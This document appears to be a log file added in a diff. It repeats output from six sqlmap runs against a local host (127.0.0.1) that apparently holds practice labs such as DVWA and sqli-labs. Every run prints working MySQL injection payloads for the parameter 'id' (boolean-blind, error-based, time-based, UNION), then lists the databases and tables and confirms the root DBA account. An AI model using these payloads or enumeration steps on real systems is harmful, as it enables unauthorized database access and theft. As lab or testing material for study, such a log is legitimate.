@@ -1,0 +1,444 @@
+***********************************
+2019-06-01:16:55:24           ___
+       __H__
+ ___ ___[.]_____ ___ ___  {1.3.5.109#dev}
+|_ -| . [.]     | .'| . |
+|___|_  [(]_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 16:55:23 /2019-06-01/
+
+[16:55:23] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (X11; NetBSD amd64; rv:16.0) Gecko/20121102 Firefox/16.0' from file 'C:\CODE\个人作品源代码\GET_SQL\ExtrAct-SQL_0.3[sqlmap高版本]\sqlmap\txt\user-agents.txt'
+[16:55:24] [INFO] resuming back-end DBMS 'mysql' 
+[16:55:24] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=2' AND 3623=3623 AND 'vBUq'='vBUq
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=2' AND (SELECT 5851 FROM(SELECT COUNT(*),CONCAT(0x7178766a71,(SELECT (ELT(5851=5851,1))),0x7170716271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'HBlq'='HBlq
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=2' AND SLEEP(5) AND 'jnma'='jnma
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: id=-5710' UNION ALL SELECT NULL,CONCAT(0x7178766a71,0x5579635356547777547a496e745a4b537a4c475346664a65766a774f53474b5874474a4445797046,0x7170716271),NULL-- ekrc
+---
+[16:55:24] [INFO] the back-end DBMS is MySQL
+web server operating system: Windows
+web application technology: Apache 2.4.23, PHP 5.5.38
+back-end DBMS: MySQL >= 5.0
+[16:55:24] [INFO] fetching current user
+current user: 'root@127.0.0.1'
+[16:55:24] [INFO] fetching current database
+current database: 'security'
+[16:55:24] [INFO] testing if current user is DBA
+[16:55:24] [INFO] fetching current user
+current user is DBA: True
+[16:55:24] [INFO] fetching database names
+[16:55:24] [INFO] used SQL query returns 18 entries
+[16:55:24] [INFO] retrieved: 'information_schema'
+[16:55:24] [INFO] retrieved: '娴嬭瘯'
+[16:55:24] [INFO] retrieved: 'challenges'
+[16:55:24] [INFO] retrieved: 'dvwa'
+[16:55:24] [INFO] retrieved: 'dwvs'
+[16:55:24] [INFO] retrieved: 'lang_cms_finds'
+[16:55:24] [INFO] retrieved: 'langzi_scan'
+[16:55:24] [INFO] retrieved: 'langzi_scan_1'
+[16:55:24] [INFO] retrieved: 'langzi_scan_2'
+[16:55:24] [INFO] retrieved: 'langzi_scan_3'
+[16:55:24] [INFO] retrieved: 'langzii_eyes'
+[16:55:24] [INFO] retrieved: 'mysql'
+[16:55:24] [INFO] retrieved: 'performance_schema'
+[16:55:24] [INFO] retrieved: 'phpmyadmin'
+[16:55:24] [INFO] retrieved: 'pikachu'
+[16:55:24] [INFO] retrieved: 'security'
+[16:55:24] [INFO] retrieved: 'test'
+[16:55:24] [INFO] retrieved: 'wenda_anwsion_com'
+available databases [18]:
+[*] challenges
+[*] dvwa
+[*] dwvs
+[*] information_schema
+[*] lang_cms_finds
+[*] langzi_scan
+[*] langzi_scan_1
+[*] langzi_scan_2
+[*] langzi_scan_3
+[*] langzii_eyes
+[*] mysql
+[*] performance_schema
+[*] phpmyadmin
+[*] pikachu
+[*] security
+[*] test
+[*] wenda_anwsion_com
+[*] 娴嬭瘯
+
+[16:55:24] [INFO] fetched data logged to text files under 'C:\Users\langzi\AppData\Local\sqlmap\output\127.0.0.1'
+
+[*] ending @ 16:55:24 /2019-06-01/
+
+
+***********************************
+2019-06-01:16:55:27           ___
+       __H__
+ ___ ___[)]_____ ___ ___  {1.3.5.109#dev}
+|_ -| . [.]     | .'| . |
+|___|_  [(]_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 16:55:26 /2019-06-01/
+
+[16:55:26] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-us) AppleWebKit/312.5 (KHTML, like Gecko) Safari/312.3' from file 'C:\CODE\个人作品源代码\GET_SQL\ExtrAct-SQL_0.3[sqlmap高版本]\sqlmap\txt\user-agents.txt'
+[16:55:26] [INFO] resuming back-end DBMS 'mysql' 
+[16:55:26] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=2' AND 3623=3623 AND 'vBUq'='vBUq
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=2' AND (SELECT 5851 FROM(SELECT COUNT(*),CONCAT(0x7178766a71,(SELECT (ELT(5851=5851,1))),0x7170716271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'HBlq'='HBlq
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=2' AND SLEEP(5) AND 'jnma'='jnma
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: id=-5710' UNION ALL SELECT NULL,CONCAT(0x7178766a71,0x5579635356547777547a496e745a4b537a4c475346664a65766a774f53474b5874474a4445797046,0x7170716271),NULL-- ekrc
+---
+[16:55:26] [INFO] the back-end DBMS is MySQL
+web server operating system: Windows
+web application technology: Apache 2.4.23, PHP 5.5.38
+back-end DBMS: MySQL >= 5.0
+[16:55:26] [INFO] fetching tables for database: 'security'
+[16:55:26] [INFO] used SQL query returns 4 entries
+[16:55:26] [INFO] retrieved: 'emails'
+[16:55:27] [INFO] retrieved: 'referers'
+[16:55:27] [INFO] retrieved: 'uagents'
+[16:55:27] [INFO] retrieved: 'users'
+Database: security
+[4 tables]
++----------+
+| emails   |
+| referers |
+| uagents  |
+| users    |
++----------+
+
+[16:55:27] [INFO] fetched data logged to text files under 'C:\Users\langzi\AppData\Local\sqlmap\output\127.0.0.1'
+
+[*] ending @ 16:55:27 /2019-06-01/
+
+
+***********************************
+2019-06-01:16:55:57           ___
+       __H__
+ ___ ___[']_____ ___ ___  {1.3.5.109#dev}
+|_ -| . [,]     | .'| . |
+|___|_  [']_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 16:55:56 /2019-06-01/
+
+[16:55:56] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.2) Gecko/20090803 Slackware Firefox/3.5.2' from file 'C:\CODE\个人作品源代码\GET_SQL\ExtrAct-SQL_0.3[sqlmap高版本]\sqlmap\txt\user-agents.txt'
+[16:55:57] [INFO] resuming back-end DBMS 'mysql' 
+[16:55:57] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=2' AND 3623=3623 AND 'vBUq'='vBUq
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=2' AND (SELECT 5851 FROM(SELECT COUNT(*),CONCAT(0x7178766a71,(SELECT (ELT(5851=5851,1))),0x7170716271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'HBlq'='HBlq
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=2' AND SLEEP(5) AND 'jnma'='jnma
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: id=-5710' UNION ALL SELECT NULL,CONCAT(0x7178766a71,0x5579635356547777547a496e745a4b537a4c475346664a65766a774f53474b5874474a4445797046,0x7170716271),NULL-- ekrc
+---
+[16:55:57] [INFO] the back-end DBMS is MySQL
+web server operating system: Windows
+web application technology: Apache 2.4.23, PHP 5.5.38
+back-end DBMS: MySQL >= 5.0
+[16:55:57] [INFO] fetching current user
+current user: 'root@127.0.0.1'
+[16:55:57] [INFO] fetching current database
+current database: 'security'
+[16:55:57] [INFO] testing if current user is DBA
+[16:55:57] [INFO] fetching current user
+current user is DBA: True
+[16:55:57] [INFO] fetching database names
+[16:55:57] [INFO] used SQL query returns 18 entries
+[16:55:57] [INFO] resumed: 'information_schema'
+[16:55:57] [INFO] resumed: '娴嬭瘯'
+[16:55:57] [INFO] resumed: 'challenges'
+[16:55:57] [INFO] resumed: 'dvwa'
+[16:55:57] [INFO] resumed: 'dwvs'
+[16:55:57] [INFO] resumed: 'lang_cms_finds'
+[16:55:57] [INFO] resumed: 'langzi_scan'
+[16:55:57] [INFO] resumed: 'langzi_scan_1'
+[16:55:57] [INFO] resumed: 'langzi_scan_2'
+[16:55:57] [INFO] resumed: 'langzi_scan_3'
+[16:55:57] [INFO] resumed: 'langzii_eyes'
+[16:55:57] [INFO] resumed: 'mysql'
+[16:55:57] [INFO] resumed: 'performance_schema'
+[16:55:57] [INFO] resumed: 'phpmyadmin'
+[16:55:57] [INFO] resumed: 'pikachu'
+[16:55:57] [INFO] resumed: 'security'
+[16:55:57] [INFO] resumed: 'test'
+[16:55:57] [INFO] resumed: 'wenda_anwsion_com'
+available databases [18]:
+[*] challenges
+[*] dvwa
+[*] dwvs
+[*] information_schema
+[*] lang_cms_finds
+[*] langzi_scan
+[*] langzi_scan_1
+[*] langzi_scan_2
+[*] langzi_scan_3
+[*] langzii_eyes
+[*] mysql
+[*] performance_schema
+[*] phpmyadmin
+[*] pikachu
+[*] security
+[*] test
+[*] wenda_anwsion_com
+[*] 娴嬭瘯
+
+[16:55:57] [INFO] fetched data logged to text files under 'C:\Users\langzi\AppData\Local\sqlmap\output\127.0.0.1'
+
+[*] ending @ 16:55:57 /2019-06-01/
+
+
+***********************************
+2019-06-01:16:55:59           ___
+       __H__
+ ___ ___[(]_____ ___ ___  {1.3.5.109#dev}
+|_ -| . [,]     | .'| . |
+|___|_  [.]_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 16:55:58 /2019-06-01/
+
+[16:55:58] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows; U; Windows NT 5.1; ja; rv:1.9.0.14) Gecko/2009082707 Firefox/3.0.14 (.NET CLR 3.5.30729)' from file 'C:\CODE\个人作品源代码\GET_SQL\ExtrAct-SQL_0.3[sqlmap高版本]\sqlmap\txt\user-agents.txt'
+[16:55:59] [INFO] resuming back-end DBMS 'mysql' 
+[16:55:59] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=2' AND 3623=3623 AND 'vBUq'='vBUq
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=2' AND (SELECT 5851 FROM(SELECT COUNT(*),CONCAT(0x7178766a71,(SELECT (ELT(5851=5851,1))),0x7170716271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'HBlq'='HBlq
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=2' AND SLEEP(5) AND 'jnma'='jnma
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: id=-5710' UNION ALL SELECT NULL,CONCAT(0x7178766a71,0x5579635356547777547a496e745a4b537a4c475346664a65766a774f53474b5874474a4445797046,0x7170716271),NULL-- ekrc
+---
+[16:55:59] [INFO] the back-end DBMS is MySQL
+web server operating system: Windows
+web application technology: Apache 2.4.23, PHP 5.5.38
+back-end DBMS: MySQL >= 5.0
+[16:55:59] [INFO] fetching tables for database: 'security'
+[16:55:59] [INFO] used SQL query returns 4 entries
+[16:55:59] [INFO] resumed: 'emails'
+[16:55:59] [INFO] resumed: 'referers'
+[16:55:59] [INFO] resumed: 'uagents'
+[16:55:59] [INFO] resumed: 'users'
+Database: security
+[4 tables]
++----------+
+| emails   |
+| referers |
+| uagents  |
+| users    |
++----------+
+
+[16:55:59] [INFO] fetched data logged to text files under 'C:\Users\langzi\AppData\Local\sqlmap\output\127.0.0.1'
+
+[*] ending @ 16:55:59 /2019-06-01/
+
+
+***********************************
+2019-06-01:16:57:22           ___
+       __H__
+ ___ ___["]_____ ___ ___  {1.3.5.109#dev}
+|_ -| . [.]     | .'| . |
+|___|_  [,]_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 16:57:21 /2019-06-01/
+
+[16:57:21] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; es-es) AppleWebKit/125.2 (KHTML, like Gecko) Safari/125.8' from file 'C:\CODE\个人作品源代码\GET_SQL\ExtrAct-SQL_0.3[sqlmap高版本]\sqlmap\txt\user-agents.txt'
+[16:57:22] [INFO] resuming back-end DBMS 'mysql' 
+[16:57:22] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=2' AND 3623=3623 AND 'vBUq'='vBUq
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=2' AND (SELECT 5851 FROM(SELECT COUNT(*),CONCAT(0x7178766a71,(SELECT (ELT(5851=5851,1))),0x7170716271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'HBlq'='HBlq
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=2' AND SLEEP(5) AND 'jnma'='jnma
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: id=-5710' UNION ALL SELECT NULL,CONCAT(0x7178766a71,0x5579635356547777547a496e745a4b537a4c475346664a65766a774f53474b5874474a4445797046,0x7170716271),NULL-- ekrc
+---
+[16:57:22] [INFO] the back-end DBMS is MySQL
+web server operating system: Windows
+web application technology: Apache 2.4.23, PHP 5.5.38
+back-end DBMS: MySQL >= 5.0
+[16:57:22] [INFO] fetching current user
+current user: 'root@127.0.0.1'
+[16:57:22] [INFO] fetching current database
+current database: 'security'
+[16:57:22] [INFO] testing if current user is DBA
+[16:57:22] [INFO] fetching current user
+current user is DBA: True
+[16:57:22] [INFO] fetching database names
+[16:57:22] [INFO] used SQL query returns 18 entries
+[16:57:22] [INFO] resumed: 'information_schema'
+[16:57:22] [INFO] resumed: '娴嬭瘯'
+[16:57:22] [INFO] resumed: 'challenges'
+[16:57:22] [INFO] resumed: 'dvwa'
+[16:57:22] [INFO] resumed: 'dwvs'
+[16:57:22] [INFO] resumed: 'lang_cms_finds'
+[16:57:22] [INFO] resumed: 'langzi_scan'
+[16:57:22] [INFO] resumed: 'langzi_scan_1'
+[16:57:22] [INFO] resumed: 'langzi_scan_2'
+[16:57:22] [INFO] resumed: 'langzi_scan_3'
+[16:57:22] [INFO] resumed: 'langzii_eyes'
+[16:57:22] [INFO] resumed: 'mysql'
+[16:57:22] [INFO] resumed: 'performance_schema'
+[16:57:22] [INFO] resumed: 'phpmyadmin'
+[16:57:22] [INFO] resumed: 'pikachu'
+[16:57:22] [INFO] resumed: 'security'
+[16:57:22] [INFO] resumed: 'test'
+[16:57:22] [INFO] resumed: 'wenda_anwsion_com'
+available databases [18]:
+[*] challenges
+[*] dvwa
+[*] dwvs
+[*] information_schema
+[*] lang_cms_finds
+[*] langzi_scan
+[*] langzi_scan_1
+[*] langzi_scan_2
+[*] langzi_scan_3
+[*] langzii_eyes
+[*] mysql
+[*] performance_schema
+[*] phpmyadmin
+[*] pikachu
+[*] security
+[*] test
+[*] wenda_anwsion_com
+[*] 娴嬭瘯
+
+[16:57:22] [INFO] fetched data logged to text files under 'C:\Users\langzi\AppData\Local\sqlmap\output\127.0.0.1'
+
+[*] ending @ 16:57:22 /2019-06-01/
+
+
+***********************************
+2019-06-01:16:57:29           ___
+       __H__
+ ___ ___[,]_____ ___ ___  {1.3.5.109#dev}
+|_ -| . [(]     | .'| . |
+|___|_  [']_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 16:57:28 /2019-06-01/
+
+[16:57:28] [INFO] fetched random HTTP User-Agent header value 'Opera/8.50 (Windows NT 4.0; U; zh-cn)' from file 'C:\CODE\个人作品源代码\GET_SQL\ExtrAct-SQL_0.3[sqlmap高版本]\sqlmap\txt\user-agents.txt'
+[16:57:29] [INFO] resuming back-end DBMS 'mysql' 
+[16:57:29] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=2' AND 3623=3623 AND 'vBUq'='vBUq
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=2' AND (SELECT 5851 FROM(SELECT COUNT(*),CONCAT(0x7178766a71,(SELECT (ELT(5851=5851,1))),0x7170716271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'HBlq'='HBlq
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=2' AND SLEEP(5) AND 'jnma'='jnma
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: id=-5710' UNION ALL SELECT NULL,CONCAT(0x7178766a71,0x5579635356547777547a496e745a4b537a4c475346664a65766a774f53474b5874474a4445797046,0x7170716271),NULL-- ekrc
+---
+[16:57:29] [INFO] the back-end DBMS is MySQL
+web server operating system: Windows
+web application technology: Apache 2.4.23, PHP 5.5.38
+back-end DBMS: MySQL >= 5.0
+[16:57:29] [INFO] fetching tables for database: 'security'
+[16:57:29] [INFO] used SQL query returns 4 entries
+[16:57:29] [INFO] resumed: 'emails'
+[16:57:29] [INFO] resumed: 'referers'
+[16:57:29] [INFO] resumed: 'uagents'
+[16:57:29] [INFO] resumed: 'users'
+Database: security
+[4 tables]
++----------+
+| emails   |
+| referers |
+| uagents  |
+| users    |
++----------+
+
+[16:57:29] [INFO] fetched data logged to text files under 'C:\Users\langzi\AppData\Local\sqlmap\output\127.0.0.1'
+
+[*] ending @ 16:57:29 /2019-06-01/
+
+
